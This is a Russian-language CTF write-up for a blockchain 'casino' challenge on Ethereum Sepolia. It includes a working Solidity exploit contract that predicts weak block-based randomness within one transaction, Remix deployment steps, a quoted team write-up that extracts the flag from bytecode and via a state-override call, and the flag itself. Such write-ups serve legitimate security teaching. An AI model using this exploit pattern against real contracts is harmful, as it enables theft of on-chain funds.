# WEB-3 Казино

> **Категория:** Blockchain · **Событие:** KubSTU CTF 2026 Autumn

## 📌 Задача

### Дано

Сеть: Ethereum Sepolia

Challenge contract:

```text
0xa8d58d2C110e84C5De16ce9530557a8f38137bCb
```

Формат флага:

```text
KubSTU{...}
```

**Файлы:** [task.txt](../../../assets/Web/Web-3%20%D0%9A%D0%B0%D0%B7%D0%B8%D0%BD%D0%BE/task.txt)

## 🏁 Решение

### Идея

Контракт просит угадать число:

```solidity
guess(uint8 answer)
```

Если `answer == random()`, адрес помечается как решивший и может вызвать `getFlag()`.

Проблема в том, что `random()` считается из публичных данных блока:

```solidity
blockhash(block.number - 1)
block.timestamp
```

Это не настоящая случайность. Другой контракт может в одной транзакции вызвать `random()`, получить правильный ответ и сразу передать его в `guess()`.

### Exploit

Создаём в Remix файл `BadRandomnessExploit.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBadRandomnessChallenge {
    function guess(uint8 answer) external;
    function random() external view returns (uint8);
    function getFlag() external view returns (string memory);
}

contract BadRandomnessExploit {
    function solve(address challenge) external {
        uint8 answer = IBadRandomnessChallenge(challenge).random();
        IBadRandomnessChallenge(challenge).guess(answer);
    }

    function getFlag(address challenge) external view returns (string memory) {
        return IBadRandomnessChallenge(challenge).getFlag();
    }
}
```

### Решение через Remix

1. Открыть `https://remix.ethereum.org/`.
2. Создать файл `BadRandomnessExploit.sol`.
<img width="1378" height="560" alt="image" src="https://github.com/user-attachments/assets/56c39d40-d5d7-49f3-a45c-eee582394ced" />
3. Скомпилировать контракт.
<img width="1243" height="480" alt="image" src="https://github.com/user-attachments/assets/d735c22d-89c3-416e-914f-d9aa5e65c40c" />
5. Во вкладке `Deploy & Run Transactions` выбрать `Injected Provider - MetaMask`

6. Установить расширение MetaMask выбрать сеть `Sepolia` и получить несколько монет в каком-нибудь кране (пример крана - https://sepolia-faucet.pk910.de/ )

<img width="730" height="521" alt="image" src="https://github.com/user-attachments/assets/c33479ce-ecc1-41eb-a662-25e756cf8c41" />

7. Задеплоить `BadRandomnessExploit`.
<img width="2550" height="1320" alt="Безымянный" src="https://github.com/user-attachments/assets/cd6eea0b-63ee-421b-8dd0-6c09cbd673fe" />

8. Вызвать:

```text
solve(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```

9. После успешной транзакции вызвать:

```text
getFlag(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```
<img width="2550" height="857" alt="Безымянный" src="https://github.com/user-attachments/assets/7f8f2e8f-7f9f-4b08-a46b-215f9abd575f" />

### Флаг

```text
KubSTU{bad_randomness_same_tx}
```

---

### Командный райтап (команда mpei_larpers)

> **Источник:** https://ctftime.org/writeup/41126 (CTFtime, пользовательский райтап) · **Событие:** KubSTU CTF 2026: Autumn

На Sepolia задеплоен контракт 0xa8d58d2C110e84C5De16ce9530557a8f38137bCb — «казино», где флаг спрятан за игрой «угадай число». `guess(uint8 answer)` принимает ответ, только если он равен

uint8(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))

и тогда помечает игрока в `solved` и открывает `getFlag()`. Оба входа этого «случайного» числа (хэш предыдущего блока и таймстамп) не меняются в пределах всего блока, так что число предсказуемо полностью. Контракт-атакующий вызывает `random()` и тут же `guess(...)` с тем же значением в одной транзакции: оба вызова видят один и тот же блок, проверка проходит всегда. А вот схема «прочитать значение в одной транзакции, отгадать в следующей» не работает — блок уже другой. В этом и суть задачи, one-transaction паттерн здесь не трюк, а интент.

Флаг, правда, даже не пришлось «выигрывать» — он лежит прямо в рантайм-коде контракта. Собрал его тремя независимыми способами, все дали одну строку:

1. `eth_getCode` — литерал флага прошит в байткод (PUSH32 на смещении 0x1fd, длина 0x1e, это ровно то, что возвращает `getFlag()`). На публичном блокчейне «private» не бывает.
2. `eth_call getFlag()` со state override, который помечает наш адрес решённым: живой контракт сам исполняет свою success-ветку и отдаёт флаг. Без override тот же вызов ревертится с `Solve first `.
3. Foundry-форк-тест, который отыгрывает честный эксплойт (вызвать `random()`, угадать, `getFlag()`) против настоящего deployed-кода: `[PASS]`, в логах флаг.

Приватный ключ, кран и фондированный аккаунт не понадобились нигде. Заодно показал предсказуемость вживую: для блока 11883331 значение `random()` = 62; `eth_call guess(62)` проходит, а контрольный `guess(63)` ревертится с `Wrong guess`. Это тот же оракул, что видит атакующий контракт внутри одной транзакции.

Селекторы, чтобы сверяться с диспетчером: getFlag()=0xf9633930, guess(uint8)=0x4ba4c16b, random()=0x5ec01e4d, solved(address)=0x5e36bdc6.

Флаг: `KubSTU{bad_randomness_same_tx}`

**Флаг:** `KubSTU{bad_randomness_same_tx}`
